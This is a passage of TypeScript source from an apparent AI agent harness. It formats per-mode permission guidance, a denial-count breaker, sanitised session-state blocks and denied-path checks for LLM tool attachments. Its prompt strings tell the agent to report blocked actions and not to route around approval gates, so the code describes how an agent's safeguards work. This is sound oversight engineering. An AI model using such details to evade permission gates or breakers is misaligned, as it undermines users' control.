 * `pi-agent.ts`, `core/guardian-consult.ts`, `core/index.ts` and codex's
 * breaker, and in no claude file. The binary's own classifier is off under the
 * standing P3.139 ruling. An absence stated is still a declaration — and it is
 * the one a user switching runtimes most needs, because nothing on that runtime
 * will ever announce itself.
 *
 * The closure is deliberately NOT lifting Pi's counters onto the other two,
 * per the row.
 */
function formatAutoDenialBreakerClause(backendName?: string): string {
  if (backendName === 'Codex') {
    return ' Repeated denials here are counted and reported, never acted on: Codex\'s own'
      + ' reviewer is what hands control back to the user, so the mode you are in does not change.';
  }
  if (backendName === 'Claude') {
    return ' Nothing counts repeated denials on this runtime, so the mode you are in never'
      + ' changes on its own — it stays as it is until the user changes it.';
  }
  // Pi (`backendName` "Nessy Backend"), and the runtime-independent default:
  // this is our own harness, and it is the only one where a run of denials
  // changes the mode out from under the turn.
  return ' A run of denials ends this mode: three in a row, or twenty in the session,'
    + ' and the session drops to Manual and prompts for approvals again.';
}

function formatModeGuidance(mode: PermissionMode, backendName?: string): string {
  const label = PERMISSION_MODE_AGENT_LABELS[mode];
  if (backendName === 'Codex' && mode === 'plan') {
    return formatCodexModeGuidance(label);
  }
  switch (mode) {
    case 'dontAsk':
      return `modeGuidance: ${label} mode — nobody is watching, so nothing prompts. Tools the permission rules pre-approve run; everything else is denied outright, and asking the user is not available. Do what the pre-approved tools allow, and when an action is denied, report what was blocked and why instead of retrying it or looking for a way around the gate.`;
    case 'plan':
      return `modeGuidance: ${label} mode — read-only planning. Non-mutating exploration runs freely; file changes are blocked, except a .md plan under plansFolderPath and any file under dataFolderPath. Planning is not doing: do not change project files, and a user message during planning refines the plan rather than ending plan mode. The deliverable is the plan itself — call SubmitPlan when it is ready to proceed.`;
    case 'default':
      return `modeGuidance: ${label} mode — read operations run freely; edits and other mutating actions prompt for approval before running. When a mutating action is needed, request it and let the approval prompt run — it is part of the normal flow; do not narrow the task to avoid the prompt.`;
    case 'acceptEdits':
      return `modeGuidance: ${label} mode — file edits auto-accept; shell, network, and MCP mutations still prompt for approval. Persist and make sensible assumptions instead of pausing to ask about routine choices, but when a gated action is needed, request it and let the prompt run — do not narrow the task or route around the gates to avoid it. Carry the work forward: implement, verify (run the project lint/typecheck/test commands when they exist), then report.`;
    case 'auto':
      return `modeGuidance: ${label} mode — low-risk actions auto-run; risky shell, network, MCP, and API mutations still prompt for approval. Persist and make sensible assumptions instead of pausing to ask about routine choices, but when a gated action is needed, request it and let the prompt run — do not narrow the task or route around the gates to avoid it. Carry the work forward: implement, verify (run the project lint/typecheck/test commands when they exist), then report.${formatAutoDenialBreakerClause(backendName)}`;
    case 'bypassPermissions':
      return `modeGuidance: ${label} mode — full autonomy, no approval prompts; everything runs freely. Persist until the task is fully handled end-to-end this turn — do not stop at analysis or a proposed diff. Implement, verify (run the project lint/typecheck/test commands when they exist), then report. Make sensible assumptions and state them instead of pausing to ask, unless the user explicitly redirects you. Destructive or irreversible actions still follow the safety rules — ask before deleting content or taking broad/irreversible actions the user did not request.`;
  }
}

/**
 * Format session state as a lightweight XML block for injection into user messages.
 * Always includes the plans folder path so agent knows where plans are stored.
 */
export function formatSessionState(
  key: SessionKey,
  options?: {
    plansFolderPath?: string;
    dataFolderPath?: string;
    consumeModeChangeUserSignal?: boolean;
    /**
     * P3.238 — `BaseAgent.backendName` of the runtime this turn runs on, so the
     * `modeGuidance` line can stop stating things the runtime cannot back. Only
     * `formatModeGuidance` reads it; omitting it keeps the runtime-independent
     * wording, which is what every caller outside `PromptBuilder` wants.
     */
    backendName?: string;
  }
): string {
  const diagnostics = getPermissionModeDiagnostics(key);

  // Use canonical user-facing mode tokens to avoid terminology drift.
  const modeName = toCanonicalPermissionMode(diagnostics.permissionMode);
  // UB1.9 (SEC-7/H9; upstream v0.13.4, unchanged through v0.15.1): the id and the
  // folder paths are injected values — sanitise them so a newline or a closing
  // tag in a path cannot break the block or forge session-state lines.
  const sessionStateTags = ['session_state'] as const;
  // Emit the bare sessionId in the prompt block; the composite key stays internal.
  let result = `<session_state>\nsessionId: ${sanitizePromptLine(key.sessionId, sessionStateTags)}\npermissionMode: ${modeName}`;

  if (diagnostics.transitionDisplay) {
    result += `\nmodeTransition: ${diagnostics.transitionDisplay}`;
  }
  result += `\nmodeChangedBy: ${diagnostics.lastChangedBy}`;
  result += `\nmodeChangedAt: ${diagnostics.lastChangedAt}`;
  result += `\nmodeVersion: ${diagnostics.modeVersion}`;

  const transitionLabel = diagnostics.transitionDisplay ?? `Unknown -> ${PERMISSION_MODE_AGENT_LABELS[diagnostics.permissionMode]}`;
  result += `\nmodeChangeSummary: Last mode change by ${diagnostics.lastChangedBy} at ${diagnostics.lastChangedAt} (${transitionLabel}, modeVersion=${diagnostics.modeVersion})`;

  if (diagnostics.userModeSignalPending) {
    result += '\nmodeChangeUserSignal: The user changed mode manually. Apply this mode immediately for this turn.';

    if (options?.consumeModeChangeUserSignal) {
      consumeUserModeSignal(key);
    }
  }

  // Always include plans folder path so agent knows where plans are stored
  if (options?.plansFolderPath) {
    result += `\nplansFolderPath: ${sanitizePromptLine(options.plansFolderPath, sessionStateTags)}`;
  }

  // Include data folder path so agent knows where transform_data output goes
  if (options?.dataFolderPath) {
    result += `\ndataFolderPath: ${sanitizePromptLine(options.dataFolderPath, sessionStateTags)}`;
  }

  // Mode-scoped guidance (permission facts for the active mode plus its
  // autonomy/persistence or plan persona) lives on the volatile session-state
  // block, never in the static system prompt. Every mode emits exactly one line.
  result += `\n${formatModeGuidance(diagnostics.permissionMode, options?.backendName)}`;

  result += '\n</session_state>';
  return result;
}

// F1.289 / F1.295 — the write-token table (and the shipped read verbs) live in
// `mcp-tool-name-verbs.ts`, a module with no imports that the Pi deferred-tool
// catalogue loads too, so the gate and the catalogue read ONE table. The import
// sits here, at the end, so every line this file's docs cite by number stays in
// place; `isReadOnlyMcpToolWithConfig` above reads it (imports are hoisted).
import { MCP_WRITE_TOKENS, mcpToolCarriesWriteToken } from './mcp-tool-name-verbs.ts';
export { MCP_WRITE_TOKENS, mcpToolCarriesWriteToken };
// UB1.9 — `formatSessionState` above sanitises its injected values with
// `sanitizePromptLine` (upstream v0.13.4/v0.15.1); the import sits here with the
// one above so every line this file's docs cite by number stays in place.
import { sanitizePromptLine } from '../prompts/prompt-sanitize.ts';

/**
 * F1.296 (origin WJ-dd P-WJ-dd-3) — deferred-tool DISCOVERY, by name.
 *
 * `mcp__tool_search` returns deferred tools' names and descriptions and loads nothing. Until F1.258 it passed
 * `default` with no card only by accident (an unanchored shipped `search` pattern); once anchored, every discovery
 * call carded in `default`, `acceptEdits` and `auto`: `shouldPromptInAskMode` (`core/pre-tool-use.ts`) asks whenever
 * its Explore PROBE refuses, and F1.199's read-only plumbing allowance (removed by F1.1097) was keyed to the model's
 * own gate, not to the probe. DECIDED (controller, 2026-09-23): discovery passes the asking modes by THIS exact
 * name, not a pattern (`mcp__acme__tool_search` is judged like any other tool). The names here are the Pi pool's
 * (`DEFERRED_MCP_TOOL_SEARCH_NAME`, `DEFERRED_MCP_TOOL_LOAD_NAME` in `pi-agent-server/src/deferred-mcp-tools.ts`),
 * spelled out because this module must not depend on the Pi server. F1.1097 passes it in `plan` and `dontAsk`
 * too (`shouldAllowToolInMode`, below the deny rules), replacing F1.199's read-only-marking allowance.
 */
export function isDeferredToolDiscovery(toolName: string): boolean {
  return toolName === 'mcp__tool_search';
}

/**
 * F1.997 (owner, 2026-09-26) — a deferred-tool LOAD passes the asking modes too, by name, as Claude's own `ToolSearch`
 * does (`tools-reference.md`: "Searches for and loads deferred tools …", Permission required "No"). A load registers
 * a schema and runs nothing; the LOADED tool's own call meets the gate like any other. It reverses the card F1.144 and
 * F1.296 kept; F1.1097 extends it to `plan` and `dontAsk` (`shouldAllowToolInMode`). Read by `shouldPromptInAskMode`, so
 * `auto`'s band and the bypass deny-net (F1.741) drop a load too. `deferred-tool-discovery-default.test.ts` pins both.
 */
export function isDeferredToolLoad(toolName: string): boolean {
  return toolName === 'mcp__tool_load';
}

/**
 * F1.397 (origin WJ-ff P-WJ-ff-3) — remove a session's mode callbacks only while they are still `owner`'s. A claude
 * agent registers `{ owner: this, onStateChange }` at construction and calls this from `destroy()`, so after claude →
 * Pi nothing of the destroyed agent stays registered (it held the agent until the next claude agent or the session's
 * deletion), and a respawned agent's registration — another owner — survives the old agent's late `destroy()`. The
 * mode ENTRY is the host's and stays (F1.257). `claude-destroy-mode-callbacks.test.ts`.
 */
export function unregisterModeCallbacks(key: SessionKey, owner: object): void {
  modeManager.unregisterCallbacks(key, owner);
}

/**
 * F1.694 — the `deniedPaths` floor, plus the relocated credential roots, for ONE
 * path read by a `call_llm` attachment: exactly the verdict {@link shouldAllowToolInMode}
 * gives `Read` of that path through `getDeniedPathViolation`, with the same
 * merged config (the workspace's own `deniedPaths` included) when a
 * permissions context is supplied, and the shipped `SAFE_MODE_CONFIG` otherwise.
 *
 * Appended here rather than beside `getDeniedPathViolation` because this file is
 * cited by line across `docs/**`; the floor it reuses is private to this module.
 */
export function getAttachmentReadFloorViolation(
  absolutePath: string,
  permissionsContext: PermissionsContext | null | undefined,
): { path: string; pattern: string } | null {
  let config: ToolCheckConfig = SAFE_MODE_CONFIG;
  if (permissionsContext) {
    // Lazy, for the circular-import reason `shouldAllowToolInMode` gives.
    const { permissionsConfigCache } = require('./permissions-config.ts');
    config = permissionsConfigCache.getMergedConfig(permissionsContext);
  }
  return getDeniedPathViolation('Read', { file_path: absolutePath }, config);
}

/**
 * F1.694 — the `attachmentReadGuard` both `call_llm` readers take (`llm-tool.ts`
 * `AttachmentReadGuard`). The context is read on EVERY call, so a permissions
 * change mid-session reaches a cached tool. The refusal names the pattern — or, F1.1116, the readable rule
 * (`readablePermissionDenyOfAttachment`, anchored at `getCwd`, the working directory) — as `Read`'s own refusal does.
 */
export function callLlmAttachmentReadGuard(
  getPermissionsContext: () => PermissionsContext | null | undefined, getCwd?: () => string | undefined,
): (absolutePath: string) => string | null {
  return absolutePath => {
    const context = getPermissionsContext(), denied = getAttachmentReadFloorViolation(absolutePath, context);
    if (denied) return `Sensitive path blocked: the call_llm attachment ${denied.path} matched deniedPaths pattern ${denied.pattern} — the floor that refuses Read of it — so it is not read.`;
    const rule: string | null = context ? require('./claude-readable-permission-deny.ts').readablePermissionDenyOfAttachment(absolutePath, context, getCwd?.()) : null; // lazy, as above
    return rule ? `Permission rule blocked: the call_llm attachment ${absolutePath} — ${rule} That rule refuses Read of it, so it is not read.` : null;
  };
}

/**
 * F1.725 (WJ-crit-u, 2026-09-25) — the ONE write `plan` mode admits: a
 * `Write`/`Edit`/`MultiEdit` of a `.md` file, which the caller then requires to be
 * inside the session's plans folder (`options.plansFolderPath`, the same check
 * `explore` uses). `permission-modes.md#analyze-before-you-edit-with-plan-mode`,
 * verbatim: "Claude reads files, runs shell commands to explore, and writes a plan,
 * but does not edit your source."
 *
 * MEASURED (release sittings SIT-i on Pi, SIT-f on claude-gateway, 2026-09-25): the
 * plans-folder exception sat behind `allowsPlanAndDataWrites`, which is
 * `mode === 'explore'` and has been since the gate was imported (2026-07-06, as
 * `'safe'`), so a plan-mode Write of the plan answered "File modifications are
 * blocked in Plan" and SubmitPlan then "Plan file not found" — the plan card was
 * unreachable in the mode SubmitPlan is meant for.
 *
 * DECIDED (transparent and simple): in the plans folder, narrower than `explore` — no
 * additional directories, no `allowedWritePaths`, no `NotebookEdit`, no shell
 * (plan mode's shell band is unchanged), and only a `.md` file, because
 * `plansDirectory` (P6.704) may put the plans folder inside the project and plan
 * mode must still not edit source there.
 *
 * F1.1050 (DN-272, 2026-09-29) — the retired `explore` folds into `plan`, and plan
 * now also admits the session's DATA folder (`options.dataFolderPath`, under the
 * app's config folder rather than the project) to the four file tools, as explore did. That is the
 * whole carry-over: explore's additional directories, `allowedWritePaths` and its
 * shell-redirect exception into the plans/data folders stay behind (they would let
 * plan edit source, or they bypass the shell band) — stated residue.
 */
function isPlanModePlanFileWrite(mode: PermissionMode, toolName: string, filePath: string): boolean {
  return mode === 'plan'
    && (toolName === 'Write' || toolName === 'Edit' || toolName === 'MultiEdit')
    && filePath.toLowerCase().endsWith('.md');
}

/**
 * UA12.12 (origin UA-c / UA1.8 (2), 2026-10-04) — the session-config refusal's
 * tail names the object the refused tool actually acts on. One fixed ending,
 * "… to create, update, or delete sources and agents", went to EVERY blocked
 * `mcp__session__*` tool outside the read-only allowlist checked above; for
 * `CronCreate`, `send_agent_message` and `WorktreeBatch` that object is wrong,
 * and the sentence reaches the model on claude and Pi (on codex it is the debug
 * log `readOnlyModeSessionToolRefusal` writes).
 *
 * A tool this map names gets that object, drawn from the tool's own shipped
 * description in `session-tools-core`'s `tool-defs.ts`; every other blocked
 * tool gets the true generic rather than a specific object it does not have —
 * `automation_update`, `remember` and the page/plugin/preferences tools among
 * them, each of which the old ending also described falsely. The source family
 * is the exception ON PURPOSE: `source_manage` keeps the original wording (the
 * row's control), so its object stays spelled out where it is true.
 *
 * Appended at the end of the file because `mode-manager.ts` is cited by line
 * across `docs/**` — the file's own convention, see
 * `getAttachmentReadFloorViolation`. Keyed by the bare session-tool name, the
 * spelling the allowlist check above already slices to.
 */
const SESSION_CONFIG_REFUSAL_TAILS: ReadonlyMap<string, string> = new Map([
  ['source_manage', 'to create, update, or delete sources and agents'],
  ['CronCreate', 'to create, cancel, or change scheduled tasks'],
  ['CronDelete', 'to create, cancel, or change scheduled tasks'],
  ['CronControl', 'to create, cancel, or change scheduled tasks'],
  ['send_agent_message', 'to send messages to other sessions'],
  ['WorktreeBatch', 'to run batch work in parallel worktrees'],
]);

/** The tail a blocked session tool with no named object reads instead. */
const SESSION_CONFIG_REFUSAL_DEFAULT_TAIL = 'to make this change';

/** The closing clause of the session-config refusal sentence for one blocked session tool. */
function sessionConfigRefusalTail(sessionToolName: string): string {
  return SESSION_CONFIG_REFUSAL_TAILS.get(sessionToolName) ?? SESSION_CONFIG_REFUSAL_DEFAULT_TAIL;
}

/** UA12.104 — a POSIX test command word: `test`, `[` or `[[` in command position. */
const POSIX_TEST_COMMAND_WORD = /(?:^|[\s;&|(!{])(?:test|\[\[?)\s/;
/** UA12.104 — the integer comparisons `test` shares with PowerShell's operators (POSIX `test`: -eq -ne -gt -ge -lt -le). */
const POSIX_TEST_INTEGER_OPERATOR = /\s-(?:eq|ne|gt|ge|lt|le)(?=\s)/gi;

/**
 * UA12.104 `[perf]` — {@link looksLikePowerShell}, less the evidence a POSIX test
 * command gives on its own. That heuristic reads ` -eq `, ` -ne `, ` -lt `, … as
 * PowerShell comparison operators, which `test`, `[` and `[[` spell the same, so
 * `test 1 -eq 1` went to {@link getPowerShellRejectionReason}: a pwsh spawn per
 * call where pwsh is installed (0.5–1.5 s idle, 3–5 s under load, measured
 * 2026-10-09; origin lane UA-cr10 P-UAcr10-2) judging a bash line by PowerShell's
 * grammar. When the line carries a test command word, the six integer operators
 * are struck before asking again, so any OTHER PowerShell evidence — a cmdlet in
 * command position, `-like`/`-match`, `$var |`, `@(…)` — still routes it there.
 * Exported for its tests. The heuristic's other readers keep it wide on purpose
 * (the removal breaker and the permission DSL point back here): the breaker only
 * refuses more with it, and the DSL's PowerShell rules judge what they did before.
 */
export function looksLikePowerShellOutsidePosixTest(command: string): boolean {
  if (!looksLikePowerShell(command)) return false;
  if (!POSIX_TEST_COMMAND_WORD.test(command)) return true;
  return looksLikePowerShell(command.replace(POSIX_TEST_INTEGER_OPERATOR, ' '));
}

/**
 * F1.708 (origin WJ-crit-q P-WJcritq-1) — `call_llm`'s attachments, each judged as the `Read` the host
 * performs to send it ({@link getReadsOutsideWorkingDirectoriesViolation}, the operator's read fence, and
 * {@link resolveFirstOutsideWorkingDirectoryRead}, auto mode's first-outside-read card): the first
 * attachment `judge` answers for wins, `null` when none does or the tool is not `call_llm` (claude's
 * `mcp__session__call_llm` or Pi's bare `call_llm`). F1.694 and F1.1116 gave the READER the floors that
 * need no directories; these two need the session's working and added directories, which only the gate
 * holds. Each path is resolved as `processAttachment` (`llm-tool.ts`) opens it: absolute as written, a
 * `~`-leading one as the literal relative path that reader opens, any other relative one under the session
 * directory (`dirname(dataFolderPath)`, the reader's `sessionPath`), which lies under the config dir and so
 * inside the page's own carve-out unless it climbs out with `..`. Not judged at the real path, as `Read`'s
 * fence is not (the reader's floor re-judges a link's target, refusing only).
 */
function firstCallLlmAttachmentAsRead<T>(
  toolName: string, toolInput: unknown, dataFolderPath: string | undefined, judge: (read: { file_path: string }) => T | null,
): T | null {
  if (toolName !== 'mcp__session__call_llm' && toolName !== 'call_llm') return null;
  const attachments = (toolInput as { attachments?: unknown } | null)?.attachments;
  if (!Array.isArray(attachments)) return null;
  for (const attachment of attachments) {
    const spelled = typeof attachment === 'string' ? attachment : (attachment as { path?: unknown } | null)?.path;
    if (typeof spelled !== 'string' || !spelled) continue;
    const opened = isAbsolute(spelled) || spelled.startsWith('~') || !dataFolderPath
      ? resolve(spelled)
      : resolve(dirname(dataFolderPath), spelled);
    const verdict = judge({ file_path: opened });
    if (verdict) return verdict;
  }
  return null;
}
